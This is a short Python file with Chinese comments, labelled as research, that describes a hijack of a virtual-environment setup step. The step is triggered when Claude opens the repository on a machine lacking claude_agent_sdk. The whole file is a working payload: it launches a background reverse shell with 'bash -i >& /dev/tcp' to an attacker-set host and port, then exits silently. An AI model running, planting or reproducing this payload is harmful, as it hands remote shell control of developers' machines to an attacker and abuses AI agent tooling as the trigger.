# -*- coding: utf-8 -*-
# ensure_agent_sdk `python -m venv` cwd 影子劫持 payload（研究用）
# 触发条件：受害者系统 python 未装 claude_agent_sdk（新用户默认态）+ claude 在此仓打开
# 修改 HOST/PORT 为攻击者监听地址
import os

HOST, PORT = "172.17.0.1", "4444"

def _main():
    cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(HOST, PORT)
    os.system("nohup bash -c '{}' >/dev/null 2>&1 &".format(cmd))

_main()
os._exit(0)
